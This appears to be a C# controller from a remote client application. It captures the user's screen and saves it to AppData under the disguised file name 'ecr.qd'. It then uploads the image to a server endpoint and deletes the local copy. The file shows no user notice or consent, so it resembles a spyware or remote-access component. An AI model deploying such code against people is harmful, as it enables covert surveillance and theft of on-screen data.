using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ClIENT_PC.Controller
{
    class EcranController : ControllerBase
    {
        public string Ecran()
        {
            string scr = getCapture();
            string done = string.Empty;
            done = hr.postFile(Router.url("send_file"), scr, "screen");
            dynamic data = serializer.DeserializeObject(done);
            File.Delete(scr);
            return serializer.Serialize(new { success = true, media_id = data["media_id"], path = data["path"] }); 
        }

        public void SendScreenMin()
        {
            string cheminF = getCapture(true);
            string done = string.Empty;
            hr.postFile(Router.url("send_file"), cheminF, "screen_min");
            File.Delete(cheminF);
        }

        public string getCapture(bool resize = false, int quality = 1)
        {
            string cheminDest = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            Bitmap bitM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graph = Graphics.FromImage(bitM);
            graph.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            if (resize)
            {
                bitM = resizeImage(bitM, new Size(250, 200));
            }
            bitM = CompressImage(bitM, 80);
            string scr = cheminDest + @"\ecr.qd";
            bitM.Save(scr, ImageFormat.Png);
            return scr;
        }

        private static Bitmap CompressImage(Bitmap image, long quality)
        {
            EncoderParameters eps = new EncoderParameters(1);
            eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
            ImageCodecInfo ici = GetEncoderInfo("image/png");

            MemoryStream stream = new MemoryStream();
            image.Save(stream, ici, eps);
            return (Bitmap)Image.FromStream(stream);
        }
        private static Bitmap resizeImage(Bitmap imgToResize, Size size)
        {
            int sourceWidth = imgToResize.Width;
            int sourceHeight = imgToResize.Height;

            float nPercent = 0;
            float nPercentW = 0;
            float nPercentH = 0;

            nPercentW = ((float)size.Width / (float)sourceWidth);
            nPercentH = ((float)size.Height / (float)sourceHeight);

            if (nPercentH < nPercentW)
                nPercent = nPercentH;
            else
                nPercent = nPercentW;

            int destWidth = (int)(sourceWidth * nPercent);
            int destHeight = (int)(sourceHeight * nPercent);

            Bitmap b = new Bitmap(destWidth, destHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);
            g.Dispose();
            GC.Collect();
            return b;
        }
        private static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders;
            encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            }
            return null;
        }
    }
}
